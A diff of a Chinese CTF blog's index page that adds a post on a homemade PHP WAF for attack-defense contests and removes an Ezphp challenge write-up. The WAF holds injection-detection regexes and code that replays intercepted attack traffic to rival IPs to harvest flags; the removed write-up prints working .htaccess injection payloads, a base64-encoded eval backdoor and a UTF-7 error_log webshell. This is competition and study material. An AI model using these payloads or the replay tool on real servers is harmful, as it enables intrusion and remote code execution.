@@ -207,6 +207,271 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d5f6518399.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/d5f6518399.html" class="post-title-link" itemprop="url">CTF-AWD线下赛劫持流量和流量转发WAF的开发</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-09-14 15:38:41" itemprop="dateCreated datePublished" datetime="2019-09-14T15:38:41+08:00">2019-09-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-14 17:21:04" itemprop="dateModified" datetime="2020-10-14T17:21:04+08:00">2020-10-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>7.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>7 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    没参加过CTF线下赛，用别人的waf又不了解其他人写的WAF的代码，万一出了问题也不好解决。因此昨晚连夜写了个WAF。WAF参考了360WAF的正则，对网站流量劫持并转发，cookie流量转发尚未完成。主要是使用了file_get_contents()发送POST和GET流量。如果使用注入等语句，将会对其进行拦截，本项目会劫持所有流量并以json的形式储存在waflog文件夹下(默认)，项目初始化会读取waflog下的ip.txt的ip写入数组，对劫持到的所有流量原样转发至该数组下的所有ip，如果存在flag{}(根据比赛修改flag的样式)将会保存至flag.txt</p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ul>
+<li>两个服务器存在相同的靶机，分别是120.<em>.\</em>.*和本地127.0.0.1</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190914/1568447577771.png" alt="img"></p>
+<ul>
+<li>本地挂上WAF</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190914/15684475369688.png" alt="img"></p>
+<ul>
+<li>将远程的靶机添加到<code>waflog\ip.txt</code>，然后对本地靶机进行攻击。发现流量和flag存储在<code>waflog</code>文件夹下。当然也就可以自动提交flag根据不同比赛的发送流量。</li>
+<li>本地flag是<code>flag{abc}</code>而远程的flag是<code>flag{I_wan_to_have_a_girlfriend}</code></li>
+<li>发现flag.txt下保存了远程的flag</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190914/15684478947549.png" alt="img"></p>
+<h2 id="成品代码"><a href="#成品代码" class="headerlink" title="成品代码"></a>成品代码</h2><pre><code class="php">&lt;?php
+error_reporting(0);
+class CTF_WAF{
+    public $getfilter;
+    public $postfilter;
+    public $cookiefilter;
+    public $url;
+    public $dir;
+    public $ip;
+    public function __construct() {
+         $this-&gt;getfilter = &quot;\\&lt;.+javascript:window\\[.{1}\\\\x|&lt;.*=(&amp;#\\d+?;?)+?&gt;|&lt;.*(data|src)=data:text\\/html.*&gt;|\\b(alert\\(|confirm\\(|expression\\(|prompt\\(|benchmark\s*?\(.*\)|sleep\s*?\(.*\)|\\b(group_)?concat[\\s\\/\\*]*?\\([^\\)]+?\\)|\bcase[\s\/\*]*?when[\s\/\*]*?\([^\)]+?\)|load_file\s*?\\()|&lt;[a-z]+?\\b[^&gt;]*?\\bon([a-z]{4,})\s*?=|^\\+\\/v(8|9)|\\b(and|or)\\b\\s*?([\\(\\)&#39;\&quot;\\d]+?=[\\(\\)&#39;\&quot;\\d]+?|[\\(\\)&#39;\&quot;a-zA-Z]+?=[\\(\\)&#39;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#39;])|\\/\\*.*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;)\s*)|UPDATE\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;)\s*)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)@{0,2}(\\(.+\\)|\\s+?.+?\\s+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;))FROM(\\(.+\\)|\\s+?.+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;))|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)|&lt;.*(iframe|frame|style|embed|object|frameset|meta|xml|a|img)|hacker&quot;;
+        //post拦截规则
+        $this-&gt;postfilter = &quot;&lt;.*=(&amp;#\\d+?;?)+?&gt;|&lt;.*data=data:text\\/html.*&gt;|\\b(alert\\(|confirm\\(|expression\\(|prompt\\(|benchmark\s*?\(.*\)|sleep\s*?\(.*\)|\\b(group_)?concat[\\s\\/\\*]*?\\([^\\)]+?\\)|\bcase[\s\/\*]*?when[\s\/\*]*?\([^\)]+?\)|load_file\s*?\\()|&lt;[^&gt;]*?\\b(onerror|onmousemove|onload|onclick|onmouseover)\\b|\\b(and|or)\\b\\s*?([\\(\\)&#39;\&quot;\\d]+?=[\\(\\)&#39;\&quot;\\d]+?|[\\(\\)&#39;\&quot;a-zA-Z]+?=[\\(\\)&#39;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#39;])|\\/\\*.*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;)\s*)|UPDATE\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;)\s*)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)(\\(.+\\)|\\s+?.+?\\s+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;))FROM(\\(.+\\)|\\s+?.+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;))|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)|&lt;.*(iframe|frame|style|embed|object|frameset|meta|xml|a|img)|hacker&quot;;
+        //cookie拦截规则
+        $this-&gt;cookiefilter = &quot;benchmark\s*?\(.*\)|sleep\s*?\(.*\)|load_file\s*?\\(|\\b(and|or)\\b\\s*?([\\(\\)&#39;\&quot;\\d]+?=[\\(\\)&#39;\&quot;\\d]+?|[\\(\\)&#39;\&quot;a-zA-Z]+?=[\\(\\)&#39;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#39;])|\\/\\*.*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;)\s*)|UPDATE\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;)\s*)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)@{0,2}(\\(.+\\)|\\s+?.+?\\s+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;))FROM(\\(.+\\)|\\s+?.+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;))|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;
+        $this-&gt;url = &#39;http://&#39;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;REQUEST_URI&#39;];
+        $this-&gt;dir = __DIR__.&#39;\\&#39;.&#39;waflog\\&#39;;
+        $this-&gt;ip = [];
+        $this-&gt;read_ip();
+
+    }
+
+    public function Flux($Value,$style){
+                switch ($style) {
+                    case &#39;post&#39;:
+                        $this-&gt;Check_Flux($Value, $this-&gt;postfilter);
+                        if(is_array($Value)){
+                            $Value = http_build_query($Value);
+                        }
+
+                        $this-&gt;data_to_file(&quot;{\&quot;&quot;.$this-&gt;url.&quot;\&quot;:&quot;.&quot;\&quot;&quot;.$Value.&quot;\&quot;}&quot;,&quot;post.txt&quot;,&#39;post&#39;);
+                        break;
+                    case &#39;get&#39;:
+                        $this-&gt;Check_Flux($Value, $this-&gt;getfilter);
+                        if(is_array($Value)){
+                            $Value = implode($Value);
+                        }
+                        $this-&gt;data_to_file($this-&gt;url.&quot;\r\n&quot;,&quot;get.txt&quot;,&#39;get&#39;);
+                        break;
+                    default:
+                        $this-&gt;Check_Flux($Value, $this-&gt;cookiefilter);
+                        if(is_array($Value)){
+                            $Value = http_build_query($Value);
+                        }
+
+                        $this-&gt;data_to_file(&quot;{\&quot;&quot;.$this-&gt;url.&quot;\&quot;:&quot;.&quot;\&quot;&quot;.$Value.&quot;\&quot;}&quot;,&quot;cookie.txt&quot;,&#39;cookie&#39;);
+                        break;
+                }            
+            }
+    public function read_ip(){
+        $file = fopen($this-&gt;dir.&quot;ip.txt&quot;, &quot;r&quot;) or exit(&quot;Unable to open file!&quot;);
+        while(!feof($file))
+        {
+         array_push($this-&gt;ip, fgets($file));
+        }
+        fclose($file);
+    }    
+
+    public function Check_Flux($Value,$ArrFiltReq){
+            if(is_array($Value)){
+            $Value=implode($Value);
+            }
+            if (preg_match(&quot;/&quot;.$ArrFiltReq.&quot;/is&quot;,$Value)==1){
+            die();
+            }
+        }
+
+    public function Request_Post($data,$url){
+        if(is_array($data)){
+                $query = http_build_query($data); //使用给出的关联（或下标）数组生成一个经过 URL-encode 的请求字符串。
+            }else{
+                $query = $data;
+            }
+        $options[&#39;http&#39;] = array(
+         &#39;timeout&#39;=&gt;60,
+         &#39;method&#39; =&gt; &#39;POST&#39;,
+         &#39;header&#39; =&gt; &#39;Content-type:application/x-www-form-urlencoded&#39;,
+         &#39;content&#39; =&gt; $query
+        );//构造一个post包
+
+        $context = stream_context_create($options);//创建并返回一个资源流上下文
+        $result = file_get_contents($url, false, $context);
+        return $result; 
+    }
+
+    public function Request_Get($url){
+        $result = file_get_contents($url);
+         //var_dump($result);
+        return $result; 
+    }
+
+    public function Get_Flag($result){
+        if(stristr($result,&#39;flag&#39;)){
+           preg_match_all(&#39;/flag{(.*?)}/&#39;, $result,$flag);
+            $this-&gt;data_to_file($flag[0][0].&quot;\r\n&quot;,&quot;flag.txt&quot;,&#39;flag&#39;);
+        }
+    }
+
+    public function data_to_file($data,$filename,$style=&#39;&#39;){
+        if(is_array($data)){
+            $data = implode($data);
+        }
+        switch ($style) {
+            case &#39;post&#39;:
+            //$jsonData = json_decode(&#39;[&#39;.file_get_contents(__DIR__.&#39;\\&#39;.$filename).&#39;]&#39;,true);
+                if(!stristr(file_get_contents($this-&gt;dir.$filename),$data)){
+
+                    if(file_exists($this-&gt;dir.$filename)){
+                        file_put_contents($this-&gt;dir.$filename,&quot;,&quot;.$data,FILE_APPEND);    
+                    }else{
+                        file_put_contents($this-&gt;dir.$filename,$data,FILE_APPEND);
+                    }
+                    for($i=0;$i&lt;count($this-&gt;ip);$i++){
+                        $this-&gt;Get_Flag($this-&gt;Request_Post(json_decode($data,true)[$this-&gt;url],&#39;http://&#39;.$this-&gt;ip[$i].&#39;/&#39;));
+                    }
+                }
+                //var_dump($jsonData);
+                break;
+            case &#39;get&#39;:
+             $js_data = $data;
+                if(!stristr(file_get_contents($this-&gt;dir.$filename),str_replace(&#39;http://&#39;.$_SERVER[&#39;HTTP_HOST&#39;], &#39;&#39;, $data))){
+                    file_put_contents($this-&gt;dir.$filename, $js_data ,FILE_APPEND);
+                    for($i=0;$i&lt;count($this-&gt;ip);$i++){
+                    $this-&gt;Get_Flag($this-&gt;Request_Get(str_replace(&quot;\r\n&quot;,&quot;&quot;,str_replace($_SERVER[&#39;HTTP_HOST&#39;], $this-&gt;ip[$i], $data))));
+                    }
+                }
+                break;
+            case &#39;cookie&#39;:
+                if(!stristr(file_get_contents($this-&gt;dir.$filename),$data)){
+                    if(file_exists($this-&gt;dir.$filename)){
+                        file_put_contents($this-&gt;dir.$filename,&quot;,&quot;.$data,FILE_APPEND);    
+                    }else{
+                        file_put_contents($this-&gt;dir.$filename,$data,FILE_APPEND);
+                    }
+                }
+                break;
+            case &#39;flag&#39;:
+                if(!stristr(file_get_contents($this-&gt;dir.$filename),$data)){
+                    file_put_contents($this-&gt;dir.$filename,$data,FILE_APPEND);
+                }
+                break;
+        }
+    }
+}
+
+
+/*******************************/
+/*         调用WAF            */
+
+$waf = new  CTF_WAF();
+
+if(isset($_GET)){
+    $waf-&gt;Flux($_GET,&#39;get&#39;);
+}
+
+if(isset($_POST)){
+    $waf-&gt;Flux($_POST,&#39;post&#39;);
+}
+
+foreach($_COOKIE as $key=&gt;$value){
+    $waf-&gt;Flux($value,&#39;cookie&#39;);
+
+}</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d7da57127d.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1999,179 +2264,6 @@ console.log(o3.b)
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d4770d39c3.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/header.jpg">
-      <meta itemprop="name" content="XiaoLeung">
-      <meta itemprop="description" content="随笔、分享、记录生活">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xiao Leung's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/articles/d4770d39c3.html" class="post-title-link" itemprop="url">X-NUCA‘2019 ——Ezphp复盘总结</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2019-08-27 13:15:01" itemprop="dateCreated datePublished" datetime="2019-08-27T13:15:01+08:00">2019-08-27</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-14 17:23:49" itemprop="dateModified" datetime="2020-10-14T17:23:49+08:00">2020-10-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>2.5k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>emmm….这次比赛题目质量太高所以我这种菜鸡基本没有做出来的题目，但是思路大体正确，但是关键点没有想出来。</p>
-<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code class="php"> &lt;?php
-    $files = scandir(&#39;./&#39;); 
-    foreach($files as $file) {
-        if(is_file($file)){
-            if ($file !== &quot;index.php&quot;) {
-                unlink($file);
-            }
-        }
-    }
-    include_once(&quot;fl3g.php&quot;);
-    if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])) {
-        highlight_file(__FILE__);
-        die();
-    }
-    $content = $_GET[&#39;content&#39;];
-    if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) {
-        echo &quot;Hacker&quot;;
-        die();
-    }
-    $filename = $_GET[&#39;filename&#39;];
-    if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1) {
-        echo &quot;Hacker&quot;;
-        die();
-    }
-    $files = scandir(&#39;./&#39;); 
-    foreach($files as $file) {
-        if(is_file($file)){
-            if ($file !== &quot;index.php&quot;) {
-                unlink($file);
-            }
-        }
-    }
-    file_put_contents($filename, $content . &quot;\nJust one chance&quot;);
-?&gt; </code></pre>
-<h2 id="复盘检讨"><a href="#复盘检讨" class="headerlink" title="复盘检讨"></a>复盘检讨</h2><p>其实这题已经想到了使用<code>.htaccess</code>文件去包含php代码但是么有想到怎么绕过<code>stristr()</code>。下面记录一下大佬们的wirte up 所用方法并复现学习一波。</p>
-<ul>
-<li>题目对解析的文件做了限制，只解析index.php，所以做这道题的思路第一反应也是使用<code>.user.ini</code>或者<code>.hatccess</code>去将PHP代码去包含金index.php</li>
-</ul>
-<h3 id="方法一-“-“绕过stristr-检测"><a href="#方法一-“-“绕过stristr-检测" class="headerlink" title="方法一 “\“绕过stristr()检测"></a>方法一 “\“绕过stristr()检测</h3><ul>
-<li><p>我们从代码的最后一行可见最后会强行拼接进来一个<code>&quot;\nJust one chance&quot;</code>导致<code>.hatccess</code>无法解析500错误。所以使用反斜杠可以将<code>\n</code>转义为普通字符后使用#注释使得<code>.hatccess</code>能够成功解析。</p>
-</li>
-<li><p>绕过<code>stristr()</code>检测同样使用“\“作为换行直接绕过该函数的关键字检测。</p>
-</li>
-<li><p>将<code>.hatccess</code>包含进所以php文件。</p>
-</li>
-</ul>
-<pre><code>php_value auto_prepend_file .htaccess</code></pre><ul>
-<li>综上构造payload：</li>
-</ul>
-<pre><code>php_value auto_prepend_fil\ 
-e .htaccess 
-#&lt;?php phpinfo();?&gt;\ </code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190827/15668911161294.png" alt="img"></p>
-<pre><code>?content=php_value auto_prepend_fil\%0Ae .htaccess%0A%23&lt;?php system(&#39;cat /fla&#39;.&#39;g&#39;);?&gt;\&amp;filename=.htaccess</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190827/1566891242808.png" alt="img"></p>
-<h3 id="方法二利用PCRE回溯次数限制绕过正则"><a href="#方法二利用PCRE回溯次数限制绕过正则" class="headerlink" title="方法二利用PCRE回溯次数限制绕过正则"></a>方法二利用PCRE回溯次数限制绕过正则</h3><ul>
-<li><p><code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1)</code>存在被绕过的可能。</p>
-</li>
-<li><p><a href="https://www.freebuf.com/articles/web/190794.html" target="_blank" rel="noopener">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
-</li>
-<li><p>上文是利用回溯次数超出最大值返回False而这里大佬使用了.hatccess去将回溯次数设置为0导致</p>
-</li>
-</ul>
-<pre><code>?content=php_value%20pcre.backtrack_limit%200%0aphp_value%20pcre.jit%200%0a%23\&amp;filename=.htaccess</code></pre><ul>
-<li>使用<code>php://filter/write=conver.base64-decode=.htaccess</code>写入base64加密的后门，将.htaccess包含入php</li>
-</ul>
-<pre><code>?filename=php://filter/write=convert.base64- 
-decode/resource=.htaccess&amp;content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcGhwX3ZhbHVlIHBjcm 
-Uuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiNhPD9waHAgZXZhbCgkX0dFVFsxXSk7Pz5c </code></pre><ul>
-<li>该方法在我自己搭的环境中并未复现成功。</li>
-</ul>
-<h3 id="利用error-log生成shell"><a href="#利用error-log生成shell" class="headerlink" title="利用error_log生成shell"></a>利用error_log生成shell</h3><ul>
-<li><code>error_lo</code>可以将php的错误信息写在指定目录下</li>
-<li>利用include_path包含UTF-7编码后的一句话</li>
-<li>利用包含文件不存在导致报错在/tmp下生成fl3g.php</li>
-</ul>
-<pre><code>php_value error_log /tmp/fl3g.php
-php_value error_reporting 32767
-php_value include_path &quot;+ADw?php eval($_GET[1])+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;
-# \</code></pre><ul>
-<li>生成后再写入如下<code>.htaccess</code>，将include目录更改为tmp和解码UTF-7(<a href="https://www.plasf.cn/2019/08/25/Easy-PHP-Write-up/">上一篇SUCTF</a>博客有提到)</li>
-</ul>
-<pre><code>php_value include_path &quot;/tmp&quot;
-php_value zend.multibyte 1
-php_value zend.script_encoding &quot;UTF-7&quot;
-# \</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190827/15668987829847.png" alt="img"></p>
-<p>（注意写入content使用url编码后传入）</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2243,7 +2335,7 @@ php_value zend.script_encoding &quot;UTF-7&quot;
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">67</span>
+          <span class="site-state-item-count">68</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -2314,12 +2406,12 @@ php_value zend.script_encoding &quot;UTF-7&quot;
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">244k</span>
+    <span title="站点总字数">248k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:42</span>
+    <span title="站点阅读时长">3:46</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
